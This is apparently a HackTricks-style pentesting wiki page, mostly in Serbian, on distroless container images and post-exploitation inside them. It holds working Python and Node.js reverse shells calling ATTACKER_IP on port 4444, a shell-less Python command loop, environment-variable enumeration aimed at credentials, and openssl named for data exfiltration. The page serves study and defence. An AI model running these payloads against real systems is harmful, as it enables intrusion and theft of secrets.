# Distroless kontejneri

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

A **distroless** container image predstavlja sliku koja sadrži **minimalne runtime komponente potrebne za pokretanje jedne specifične aplikacije**, dok namerno uklanja uobičajene alatke distribucije kao što su menadžeri paketa, shell-ovi i velike skupove generičkih userland utilitija. U praksi, distroless slike često sadrže samo aplikacioni binar ili runtime, njegove deljene biblioteke, bundle sertifikata i veoma malu strukturu fajl sistema.

Poenta nije u tome da je distroless nova kernel izolaciona primitiva. Distroless je strategija dizajna slike. Menja šta je dostupno **unutar** fajl sistema kontejnera, a ne kako kernel izoluje kontejner. Ta razlika je važna, jer distroless ojačava okruženje pretežno smanjenjem onoga što napadač može iskoristiti nakon što dobije izvršavanje koda. Ne zamenjuje namespaces, seccomp, capabilities, AppArmor, SELinux, ili bilo koji drugi runtime mehanizam izolacije.

## Zašto Distroless postoji

Distroless slike se pretežno koriste da smanje:

- veličinu slike
- operativnu kompleksnost slike
- broj paketa i binarnih fajlova koji bi mogli sadržati ranjivosti
- broj post-exploitation alata dostupnih napadaču po defaultu

Zato su distroless slike popularne u produkcionim deployment-ima aplikacija. Kontejner koji ne sadrži shell, nema package manager i skoro da nema generički tooling obično je lakše razumeti operativno i teže zloupotrebiti interaktivno nakon kompromisa.

Primeri poznatih distroless-style porodica slika uključuju:

- Google's distroless images
- Chainguard hardened/minimal images

## Šta Distroless ne znači

A distroless kontejner **nije**:

- automatski rootless
- automatski non-privileged
- automatski read-only
- automatski zaštićen seccomp-om, AppArmor-om, ili SELinux-om
- automatski siguran od container escape

Još uvek je moguće pokrenuti distroless sliku sa `--privileged`, deljenjem host namespace-a, opasnim bind mount-ovima, ili montiranim runtime socket-om. U takvom scenariju, slika može biti minimalna, ali kontejner i dalje može biti katastrofalno nesiguran. Distroless menja **userland attack surface**, ne **kernel trust boundary**.

## Tipične operativne karakteristike

Kada kompromitujete distroless kontejner, prvo što obično primetite je da uobičajene pretpostavke prestaju da važe. Možda nema `sh`, nema `bash`, nema `ls`, nema `id`, nema `cat`, i ponekad čak ni okruženje bazirano na libc koje se ponaša onako kako vaša uobičajena tradecraft očekuje. To utiče i na ofanzivu i na odbranu, jer nedostatak alata menja način debugovanja, incident response-a i post-exploitationa.

Najčešći obrasci su:

- runtime aplikacije postoji, ali skoro ništa drugo ne postoji
- shell-bazirani payload-i ne rade zato što nema shell-a
- česti one-lineri za enumeraciju ne rade jer helper binariji nedostaju
- zaštite fajl sistema kao što su read-only rootfs ili `noexec` na writable tmpfs lokacijama često su prisutne

Ta kombinacija je ono što obično navodi ljude da govore o "weaponizing distroless".

## Distroless And Post-Exploitation

Glavni ofanzivni izazov u distroless okruženju često nije inicijalni RCE. Često je problem šta sledi. Ako kompromitovani workload daje izvršavanje koda u language runtime-u kao što su Python, Node.js, Java, ili Go, možda ćete moći da izvršavate proizvoljnu logiku, ali ne kroz normalne shell-centrisane tokove rada koji su uobičajeni na drugim Linux target-ima.

To znači da post-exploitation često skreće u jednom od tri pravca:

1. **Koristite postojeći language runtime direktno** da enumerišete okruženje, otvorite sokete, čitate fajlove, ili stage-ujete dodatne payload-e.
2. **Ubacite sopstveni tooling u memoriju** ako je fajl sistem read-only ili su writable lokacije montirane `noexec`.
3. **Iskoristite postojeće binarije koje su već prisutne u slici** ako aplikacija ili njene zavisnosti uključuju nešto neočekivano korisno.

## Abuse

### Enumerišite runtime koji već imate

U mnogim distroless kontejnerima nema shell-a, ali i dalje postoji aplikacioni runtime. Ako je target Python servis, Python je prisutan. Ako je target Node.js, Node je prisutan. To često daje dovoljno funkcionalnosti da enumerišete fajlove, pročitate environment varijable, otvorite reverse shells, i pripremite izvršavanje u memoriji bez ikada pozivanja `/bin/sh`.

Jednostavan primer sa Python-om:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Jednostavan primer sa Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Uticaj:

- oporavak varijabli okruženja, često uključujući credentials ili service endpoints
- enumeracija datotečnog sistema bez `/bin/ls`
- identifikacija upisivih putanja i montiranih secrets

### Reverse Shell Without `/bin/sh`

Ako image ne sadrži `sh` ili `bash`, klasični reverse shell zasnovan na shell-u može odmah da ne uspe. U tom slučaju, umesto toga koristi instalirani runtime jezika.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Ako `/bin/sh` ne postoji, zamenite poslednji red direktnim izvršavanjem komandi pomoću Pythona ili Python REPL petljom.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Opet, ako je `/bin/sh` odsutan, koristite Node-ove filesystem, process i networking API-je direktno umesto da pokrećete shell.

### Potpun primer: No-Shell Python Command Loop

Ako image ima Python, ali uopšte nema shell, jednostavna interaktivna petlja često je dovoljna da održi punu post-exploitation sposobnost:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Ovo ne zahteva interaktivni shell binarni fajl. Sa stanovišta napadača, efekat je praktično isti kao kod osnovnog shell-a: izvršavanje komandi, enumeracija i postavljanje daljih payloads-a kroz postojeći runtime.

### Izvršavanje alata u memoriji

Distroless images se često kombinuju sa:

- `readOnlyRootFilesystem: true`
- pisiv, ali `noexec` tmpfs kao što je `/dev/shm`
- nedostatak alata za upravljanje paketima

Ta kombinacija čini klasične radne tokove "preuzmi binarni fajl na disk i pokreni ga" nepouzdanim. U tim slučajevima, tehnike izvršavanja u memoriji postaju glavno rešenje.

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

The most relevant techniques there are:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Postojeći binarni fajlovi već u image-u

Neke distroless images i dalje sadrže operativno neophodne binarne fajlove koji postanu korisni nakon kompromitovanja. Često viđen primer je `openssl`, jer aplikacijama ponekad treba za crypto- ili TLS-povezane zadatke.

Brz obrazac za pretragu je:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Ako je `openssl` prisutan, može se iskoristiti za:

- odlazne TLS veze
- data exfiltration preko dozvoljenog egress kanala
- staging payload podataka kroz encoded/encrypted blobs

Tačna zloupotreba zavisi od toga šta je zapravo instalirano, ali opšta ideja je da distroless ne znači "nema alata uopšte"; znači "daleko manje alata nego u normalnoj distribucijskoj slici".

## Provere

Cilj ovih provera je da se utvrdi da li je image zaista distroless u praksi i koji runtime ili helper binarni fajlovi su i dalje dostupni za post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Zanimljivo ovde:

- Ako nema shell-a, ali je prisutan runtime kao što su Python ili Node, post-exploitation treba da preusmeri aktivnost na izvršavanje kroz taj runtime.
- Ako je root filesystem samo za čitanje, a `/dev/shm` je upisiv ali `noexec`, tehnike izvršavanja iz memorije postaju mnogo relevantnije.
- Ako pomoćni binarni fajlovi kao što su `openssl`, `busybox`, ili `java` postoje, oni mogu ponuditi dovoljno funkcionalnosti za inicijalno proširenje pristupa.

## Runtime Defaults

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | Minimalan userland po dizajnu | Nema shell-a, nema package manager-a, samo application/runtime zavisnosti | dodavanje debugging slojeva, sidecar shell-ova, kopiranje `busybox`-a ili alata |
| Chainguard minimal images | Minimalan userland po dizajnu | Smanjen paketni opseg, često fokusiran na jedan runtime ili servis | korišćenje `:latest-dev` ili debug varijanti, kopiranje alata tokom build-a |
| Kubernetes workloads using distroless images | Zavisi od Pod konfiguracije | Distroless utiče samo na userland; bezbednosna pozicija Pod-a i dalje zavisi od Pod spec i runtime podrazumevanja | dodavanje privremenih debug kontejnera, host mount-ova, privilegisanih Pod podešavanja |
| Docker / Podman running distroless images | Zavisi od run flag-ova | Minimalan filesystem, ali runtime bezbednost i dalje zavisi od zastavica i konfiguracije daemona | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

Ključna poenta je da je distroless **image property**, a ne runtime zaštita. Njena vrednost proizilazi iz smanjenja onoga što je dostupno unutar filesystem-a nakon kompromitovanja.

## Povezane stranice

Za bypass-e fajl sistema i izvršavanja u memoriji koji su često potrebni u distroless okruženjima:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Za zloupotrebu container runtime-a, socketa i mount-ova koja i dalje važi za distroless workloads:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
